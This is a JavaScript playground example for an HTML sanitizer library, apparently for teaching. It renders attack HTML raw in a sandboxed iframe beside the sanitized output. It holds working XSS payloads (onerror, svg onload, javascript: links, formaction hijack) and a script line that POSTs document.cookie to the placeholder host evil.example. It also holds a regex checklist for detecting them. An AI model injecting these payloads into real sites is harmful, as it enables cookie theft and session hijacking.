// Runnable example: an interactive playground -- type or paste HTML (or
// pick a real attack from the corpus), see it rendered three ways at once:
// raw `innerHTML` in an isolated iframe (so you can watch an attack
// actually fire), safe-fragment's sanitized output, and a live diff/report
// of what changed. Also demos the ui-v1 "content requests, host decides"
// action protocol.
//
// Open examples/04-playground/index.html via a static file server after
// `npm run build`. `run()` below only exercises the default render (for
// the automated smoke test); the interactive UI is wired up by
// `mountPlayground()`, called directly from index.html's own script.

import { registerSafeFragment, registerProfile, deriveProfile, getProfile } from "../../dist/index.js";

export const AGENT_PROFILE = "playground-ui-v1";

const registeredTags = new Set();

function ensureRegistered(tagName = "safe-fragment") {
  if (!registeredTags.has(tagName)) {
    registeredTags.add(tagName);
    registerSafeFragment({ tagName });
  }
  if (!getProfile(AGENT_PROFILE)) {
    registerProfile(
      deriveProfile("ui-v1", {
        name: AGENT_PROFILE,
        customElements: [
          { tag: "ui-card", attributes: ["tone"] },
          { tag: "ui-stat", attributes: ["label", "value", "trend"] },
          { tag: "ui-button", attributes: ["variant", "disabled", "data-action", "data-value"] },
        ],
      }),
    );
  }
}

export const DEFAULT_PAYLOAD = `<h2>Welcome back!</h2>
<p>Here's your weekly digest.</p>
<p><img src="https://picsum.photos/seed/safe-fragment/320/120" alt="digest banner"></p>
<p>A colleague shared this with you: <a href="javascript:alert('cookie stolen: ' + document.cookie)">View shared document</a> (try clicking it in the unprotected box)</p>
<p>Broken tracking pixel: <img src="x" onerror="alert('pwned via onerror')"></p>
<svg onload="alert('pwned via svg onload')" width="1" height="1"></svg>
<script>fetch('https://evil.example/exfiltrate', {method: 'POST', body: document.cookie})</script>
`;

export const ATTACK_PRESETS = [
  { label: "img onerror", html: `<p>Product photo:</p>\n<img src="x" onerror="alert('pwned via onerror')">` },
  {
    label: "javascript: link",
    html: `<p>Your account needs attention: <a href="javascript:alert('pwned via javascript: URL')">Click to review</a></p>`,
  },
  { label: "svg onload", html: `<p>Icon:</p>\n<svg onload="alert('pwned via svg onload')" width="24" height="24"></svg>` },
  {
    label: "formaction hijack",
    html: `<form><p>Confirm your order:</p><button formaction="javascript:alert('pwned via formaction')">Submit</button></form>`,
  },
  { label: "everything at once", html: DEFAULT_PAYLOAD },
];

/** Very rough, demo-only dangerous-pattern checklist -- NOT part of safe-fragment's own SanitizationReport (see index.html for why they can differ). */
export function dangerousPatternsIn(rawInput, renderedHtml) {
  const patterns = [
    { label: "onerror=", re: /\bonerror\s*=/gi },
    { label: "onload=", re: /\bonload\s*=/gi },
    { label: "onclick=/onmouseover=", re: /\bon(click|mouseover)\s*=/gi },
    { label: "javascript: URL", re: /javascript:/gi },
    { label: "<script>", re: /<script/gi },
    { label: "formaction=", re: /\bformaction\s*=/gi },
  ];
  return patterns
    .filter((p) => p.re.test(rawInput))
    .map((p) => {
      p.re.lastIndex = 0;
      return { label: p.label, stillPresent: p.re.test(renderedHtml) };
    });
}

export function simulateHostAction(action, value) {
  switch (action) {
    case "open-issues":
      return "navigating to /issues (simulated -- no real router here)";
    case "delete-branch":
      return `would confirm, then delete branch "${value}" (simulated -- nothing actually deleted)`;
    default:
      return "no handler registered for this action -- host app ignores it";
  }
}

/** Renders the default article-v1 fixture once. Exercised by the smoke test; also what index.html falls back to before you touch anything. */
export async function run(container, { tagName = "safe-fragment" } = {}) {
  ensureRegistered(tagName);

  const el = document.createElement(tagName);
  el.setAttribute("profile", "article-v1");
  container.appendChild(el);

  const renderPromise = new Promise((resolve) => {
    el.addEventListener("safe-fragment:render", (event) => resolve(event.detail.report), { once: true });
  });

  el.html = DEFAULT_PAYLOAD;
  const report = await renderPromise;

  return { element: el, report };
}

/** Renders `html` under `profile` into a fresh <safe-fragment> inside `container`. Returns the element and its report (or a {rejected} marker). */
export async function renderProtected(container, html, profile, { tagName = "safe-fragment" } = {}) {
  ensureRegistered(tagName);
  container.replaceChildren();

  const el = document.createElement(tagName);
  el.setAttribute("profile", profile);
  container.appendChild(el);

  const resultPromise = new Promise((resolve) => {
    el.addEventListener("safe-fragment:render", (event) => resolve({ report: event.detail.report }), { once: true });
    el.addEventListener("safe-fragment:reject", (event) => resolve({ rejected: event.detail }), { once: true });
  });

  el.html = html;
  const settled = await resultPromise;
  return { element: el, ...settled };
}

/** Renders raw, unsanitized `html` into a sandboxed iframe via literal innerHTML -- deliberately unprotected, so any live attack in it actually runs. window.alert/confirm/prompt are overridden inside the iframe to flash a visible banner instead of blocking on a native dialog. */
export function renderRawUnprotected(iframeEl, html) {
  iframeEl.setAttribute("sandbox", "allow-scripts");
  iframeEl.srcdoc = `<!doctype html><html><head><meta charset="utf-8"><style>
    :root { color-scheme: dark; }
    body { font: 13px/1.5 system-ui, sans-serif; margin: 10px; color: #ddd; background: #1a1a1e; }
    #banner { display: none; background: #ff3b3b; color: #fff; padding: 6px 10px; border-radius: 6px; margin-bottom: 8px; font-weight: 700; }
    a { color: #6ab0ff; }
    img { max-width: 100%; }
  </style></head><body>
  <div id="banner"></div>
  <div id="target"></div>
  <script>
    window.alert = window.confirm = window.prompt = function (msg) {
      var b = document.getElementById("banner");
      b.textContent = "\\uD83D\\uDEA8 EXECUTED: alert(" + JSON.stringify(String(msg)) + ")";
      b.style.display = "block";
      return true;
    };
    try {
      document.getElementById("target").innerHTML = ${JSON.stringify(html).replace(/<\/script/gi, "<\\/script")};
    } catch (e) {
      document.getElementById("target").textContent = "threw: " + e.message;
    }
  <\/script>
  </body></html>`;
}
